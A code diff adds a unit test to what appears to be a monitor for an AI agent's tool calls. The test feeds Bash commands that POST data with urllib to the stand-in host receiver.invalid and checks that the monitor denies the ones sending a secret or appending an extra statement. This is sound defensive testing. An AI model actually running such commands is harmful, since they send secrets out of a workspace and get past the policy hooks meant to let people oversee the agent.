@@ -9117,6 +9117,33 @@ class InformationFlowTest(unittest.TestCase):
         self.assertEqual(1, len(github_sinks))
         self.assertEqual(0, github_sinks[0].metadata.get("segment_index"))
 
+    def test_exact_profile_checks_closed_python_http_literals(self) -> None:
+        import shlex
+        from hook_monitor.analysis.python_http_payload import urllib_literal_script
+
+        workspace = self._write_runtime_source_config()
+        for index, (body, suffix, allowed) in enumerate([
+            (b"PUBLIC_LITERAL", "", True),
+            (SECRET.encode(), "", False),
+            (b"PUBLIC_LITERAL", "; print('extra execution')", False),
+        ]):
+            with self.subTest(index=index):
+                script = urllib_literal_script("http://receiver.invalid/send", body, {}) + suffix
+                event = self._record(
+                    "pre_tool_use", f"python-literal-{index}", "Bash",
+                    tool_input={"command": "python -I -S -B -c " + shlex.quote(script)},
+                    cwd=str(workspace),
+                )
+                output = evaluate_pre_tool_hook_policy(
+                    self.store, workspace, current_event=event,
+                    sink_payload_exact_enforcement_enabled=True,
+                    externality_decision=ExternalityHookDecision("c" * 64, "queued"),
+                )
+                if allowed:
+                    self.assertEqual({}, output)
+                else:
+                    self.assertEqual("deny", output["hookSpecificOutput"]["permissionDecision"])
+
     def test_exact_profile_keeps_dynamic_github_issue_view_fail_closed(self) -> None:
         workspace = self._write_runtime_source_config()
         event = self._record(
